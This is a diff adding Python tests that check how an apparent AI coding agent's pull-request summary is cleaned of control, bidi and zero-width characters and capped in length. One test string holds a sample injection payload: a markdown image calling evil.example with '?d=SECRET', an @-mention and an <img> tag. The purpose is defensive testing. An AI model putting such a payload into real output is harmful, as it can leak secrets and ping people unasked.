@@ -20,6 +20,7 @@ from repolace_agents import graph as graph_module
 from repolace_agents.contracts import AgentLimits, AgentRunner, IssueContext, StopReason
 from repolace_agents.graph import (
     KEEP_RECENT_TOOL_RESULTS,
+    MAX_SUMMARY_CHARS,
     MAX_TOOL_CALLS_PER_REPLY,
     MAX_TRANSCRIPT_CHARS,
     RunContext,
@@ -724,6 +725,62 @@ class TestSummary:
 
         assert result.stop_reason is StopReason.STEP_CAP
         assert result.last_attempt == clean(2) and result.summary is None
+
+
+class TestSummaryLeavesCleaned:
+    """`submit.summary` is the model's text, and it is stored and quoted in a pull request."""
+
+    HOSTILE = "line1\x00\u202e@org/team Fixes django/django#123 ![x](https://evil.example/p.png?d=SECRET) <img src=//e>"
+
+    async def test_nul_bidi_and_control_characters_are_removed(self):
+        result = await run(ScriptedLLM([submit_reply(self.HOSTILE)]), ScriptedVerifier([clean(1)]))
+
+        assert result.summary is not None
+        assert "\x00" not in result.summary and "\u202e" not in result.summary
+        assert result.summary.startswith("line1@org/team")
+
+    async def test_markdown_mentions_and_links_are_left_for_the_pull_request_writer(self):
+        """Neutralising them needs to know where the text lands; that is not decided here."""
+        result = await run(ScriptedLLM([submit_reply(self.HOSTILE)]), ScriptedVerifier([clean(1)]))
+
+        assert result.summary is not None
+        assert "@org/team" in result.summary and "![x](https://evil.example" in result.summary
+
+    @pytest.mark.parametrize("nasty", ["a\x00b", "a\x1bb", "a\u200bb", "a\U000e0041b", "a\ud800b", "a\u2066b"])
+    async def test_every_dropped_class_is_gone(self, nasty):
+        result = await run(ScriptedLLM([submit_reply(nasty)]), ScriptedVerifier([clean(1)]))
+
+        assert result.summary == "ab"
+
+    async def test_the_summary_is_capped(self):
+        async def submit(args):
+            return ToolOutcome("submitted", submitted=True, summary=args["summary"])
+
+        # The scripted toolbox's own submit limits the summary to 1,000 characters; the real
+        # one allows 4,000, so a longer one has to be able to reach the graph.
+        toolbox = ToolBox([FunctionTool("submit", submit, parameters=object_schema({"summary": {"type": "string"}}, ["summary"]))])
+
+        result = await run(ScriptedLLM([submit_reply("s" * 10_000)]), ScriptedVerifier([clean(1)]), tools=toolbox)
+
+        assert result.summary is not None and len(result.summary) == MAX_SUMMARY_CHARS
+
+    async def test_a_summary_with_nothing_left_is_none(self):
+        result = await run(ScriptedLLM([submit_reply("\u200b\x00 \u202e")]), ScriptedVerifier([clean(1)]))
+
+        assert result.summary is None
+
+    async def test_the_scored_summary_of_an_earlier_attempt_is_cleaned_too(self):
+        """The summary reported after a later attempt dies on a budget is attempt 1's: same cleaning."""
+        llm = ScriptedLLM([submit_reply("one\x00 two"), exceeded()])
+
+        result = await run(llm, ScriptedVerifier([red(1)]))
+
+        assert result.stop_reason is StopReason.BUDGET_USD and result.summary == "one two"
+
+    async def test_an_ordinary_summary_is_untouched(self):
+        result = await run(ScriptedLLM([submit_reply("Fixed the off-by-one in parse(). Added a guard. Kept the API.")]), ScriptedVerifier([clean(1)]))
+
+        assert result.summary == "Fixed the off-by-one in parse(). Added a guard. Kept the API."
 
 
 class TestRecursionGuard:
